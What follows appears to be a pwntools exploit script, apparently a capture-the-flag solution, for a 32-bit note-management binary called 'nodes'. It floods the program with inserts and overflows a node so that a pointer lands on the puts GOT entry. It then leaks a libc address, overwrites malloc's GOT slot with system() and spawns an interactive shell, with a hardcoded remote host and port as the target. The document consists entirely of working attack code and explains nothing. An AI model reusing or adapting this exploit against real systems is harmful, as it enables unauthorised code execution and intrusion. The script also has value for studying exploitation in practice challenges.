from pwn import *
import time
context(arch = 'i386', os = 'linux', endian = 'little')
context.log_level = 'debug'

def insert(p, value, data):
	p.recvuntil('choice:')
	p.sendline('1')
	p.recvuntil('Value:')
	p.sendline(str(value))
	p.recvuntil('Data:')
	p.send(data)

def update(p, old_value, new_value, new_data):
	p.recvuntil('choice:')
	p.sendline('2')
	p.recvuntil('value:')
	p.sendline(str(old_value))
	p.recvuntil('value:')
	p.sendline(str(new_value))
	p.recvuntil('data:')
	p.send(new_data)

def printnote(p):
	p.recvuntil('choice:')
	p.sendline('3')

def game_start(ip, port, debug, timeout):
	if debug == 1:
		p = process('./nodes')
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
		gdb.attach(p)
	else:
		p = remote(ip, port)
		libc = ELF('libc.so.6')
	insert(p, 0x01, '/bin/sh')
	insert(p, 0x02, 'hack by w1tcher')
	for i in range(10 - 2):
		insert(p, 0x03 + i, 'hack by w1tcher')

	for i in range(90):
		insert(p, 11 + i, '')

	puts_got_addr = 0x0804A024
	update(p, 100, 100, '\x00' * 0x30 + p32(puts_got_addr - 0x04))

	# insert(p, 101, '\x00' * 0x30 + p32(puts_got_addr - 0x04))
	printnote(p)
	p.recvuntil('Value:100')
	p.recvuntil('Value:')
	libc.address = int(p.recvline()[0: -1]) - libc.symbols['malloc']
	print 'libc address : ', hex(libc.address)
	update(p, libc.symbols['malloc'], libc.symbols['malloc'], p32(libc.symbols['system']))
	printnote(p)

	p.interactive()

if __name__ == '__main__':
	game_start('111.230.132.82', 40003, 1, 0.5)